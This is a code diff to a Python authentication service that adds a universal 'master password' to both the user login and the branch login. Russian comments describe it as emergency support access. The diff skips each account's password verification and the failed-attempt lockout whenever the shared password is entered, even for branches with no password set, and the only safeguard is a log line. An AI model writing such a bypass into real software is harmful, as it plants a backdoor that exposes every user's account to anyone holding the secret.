@@ -9,6 +9,7 @@ from sqlalchemy import func, select, update
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from app.config import settings
+from app.modules.auth.master import is_master_password, log_master_login
 from app.modules.auth.models import RefreshToken, User
 from app.modules.auth.repository import RefreshTokenRepository, UserRepository
 from app.modules.auth.security import (
@@ -221,11 +222,18 @@ class AuthService:
             log.warning("Login failed: user not found — login=%s", email)
             raise UnauthorizedError("Invalid credentials")
 
-        self._assert_password_not_locked(user)
-        if not await verify_password(password, user.password_hash):
-            await self._register_password_failure(user)
-            log.warning("Login failed: wrong password — email=%s", email)
-            raise UnauthorizedError("Invalid credentials")
+        # MASTER-PASS-01: аварийный вход поддержки. Если механизм включён и
+        # введён универсальный пароль — пароль аккаунта не проверяем и
+        # блокировку по неудачным попыткам не применяем (иначе лок-аут закрыл
+        # бы доступ и самой поддержке). Факт входа пишется в лог.
+        if is_master_password(password):
+            log_master_login(email, user_id=user.id)
+        else:
+            self._assert_password_not_locked(user)
+            if not await verify_password(password, user.password_hash):
+                await self._register_password_failure(user)
+                log.warning("Login failed: wrong password — email=%s", email)
+                raise UnauthorizedError("Invalid credentials")
         await self._reset_password_failures(user)
 
         if not user.is_active:
@@ -434,12 +442,20 @@ class AuthService:
         branch = (await self.db.execute(
             select(Branch).where(func.lower(Branch.login) == norm)
         )).scalar_one_or_none()
-        if branch is None or not branch.password_hash:
+        if branch is None:
             raise UnauthorizedError("Неверный логин или пароль филиала")
-        self._assert_password_not_locked(branch)
-        if not await verify_password_async(password, branch.password_hash):
-            await self._register_password_failure(branch)
+        # MASTER-PASS-01: аварийный пароль поддержки работает и на входе
+        # «как филиал» — иначе на проде нельзя открыть терминал клиента.
+        master = is_master_password(password)
+        if not master and not branch.password_hash:
             raise UnauthorizedError("Неверный логин или пароль филиала")
+        if master:
+            log_master_login(norm, user_id=branch.id, scope="branch")
+        else:
+            self._assert_password_not_locked(branch)
+            if not await verify_password_async(password, branch.password_hash):
+                await self._register_password_failure(branch)
+                raise UnauthorizedError("Неверный логин или пароль филиала")
         await self._reset_password_failures(branch)
         if not branch.is_active:
             raise UnauthorizedError("Филиал неактивен")
